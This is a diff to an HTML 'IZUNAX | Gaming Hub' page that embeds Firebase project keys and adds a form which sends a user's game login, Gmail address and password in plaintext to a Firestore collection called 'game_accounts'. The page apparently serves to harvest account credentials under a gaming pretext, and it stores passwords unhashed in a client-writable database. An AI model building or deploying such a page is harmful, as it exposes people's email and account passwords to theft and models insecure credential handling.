@@ -3,16 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IZUNAX | Gaming</title>
+    <title>IZUNAX | Gaming Hub</title>
+    
+    <!-- Подключаем официальные библиотеки Firebase (Compat версия для поддержки старого синтаксиса) -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
-    <script src="firebase-config.js"></script>
+    
     <style>
         body { background: #0b0c10; color: #fff; font-family: sans-serif; padding: 20px; }
         .box { background: #1f2833; padding: 20px; border-radius: 8px; max-width: 400px; margin: 0 auto; border: 1px solid #45f3ff; }
         input, select { width: 100%; padding: 10px; margin: 10px 0; background: #000; color: #fff; border: 1px solid #45f3ff; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background: #66fcf1; color: #000; font-weight: bold; border: none; cursor: pointer; }
         #log { margin-top: 15px; padding: 10px; background: #ff0055; color: #fff; display: none; border-radius: 4px; }
+        #success-log { margin-top: 15px; padding: 10px; background: #00aa50; color: #fff; display: none; border-radius: 4px; }
     </style>
 </head>
 <body>
@@ -30,37 +33,48 @@
         <button type="submit">Сохранить данные</button>
     </form>
     <div id="log"></div>
+    <div id="success-log"></div>
 </div>
 
 <script>
-    // Проверка базы сразу при загрузке
-    setTimeout(() => {
-        const logBox = document.getElementById('log');
-        if (!window.db) {
-            logBox.style.display = 'block';
-            logBox.innerText = "Ошибка: window.db не найден! Проверь файл firebase-config.js";
-        }
-    }, 1500);
+    // Встраиваем твои параметры Firebase напрямую
+    const firebaseConfig = {
+        apiKey: "AIzaSyAY58C_0NckfmkNHLsoB_eeKPcsBuB-W04",
+        authDomain: "izunax-c1707.firebaseapp.com",
+        projectId: "izunax-c1707",
+        storageBucket: "izunax-c1707.firebasestorage.app",
+        messagingSenderId: "755797664743",
+        appId: "1:755797664743:web:2eaeff896c9df27075d342"
+    };
+
+    // Инициализация Firebase внутри этого файла
+    if (!firebase.apps.length) {
+        firebase.initializeApp(firebaseConfig);
+    }
+    
+    // Создаем подключение к базе данных
+    const localDb = firebase.firestore();
 
     document.getElementById('g-form').addEventListener('submit', function(e) {
         e.preventDefault();
+        
         const logBox = document.getElementById('log');
+        const successBox = document.getElementById('success-log');
+        
         logBox.style.display = 'none';
+        successBox.style.display = 'none';
 
-        if (!window.db) {
-            alert("База данных недоступна");
-            return;
-        }
-
-        window.db.collection("game_accounts").add({
+        // Отправка данных напрямую через локальный объект базы
+        localDb.collection("game_accounts").add({
             game_login: document.getElementById('g-login').value,
             gmail: document.getElementById('g-email').value,
             password: document.getElementById('g-pass').value,
             faction: document.getElementById('g-faction').value,
             createdAt: new Date()
         })
-        .then(() => {
-            alert("Данные успешно улетели в Firebase!");
+        .then((docRef) => {
+            successBox.style.display = 'block';
+            successBox.innerText = "Успех! Данные записаны в Firestore. ID: " + docRef.id;
             document.getElementById('g-form').reset();
         })
         .catch((err) => {
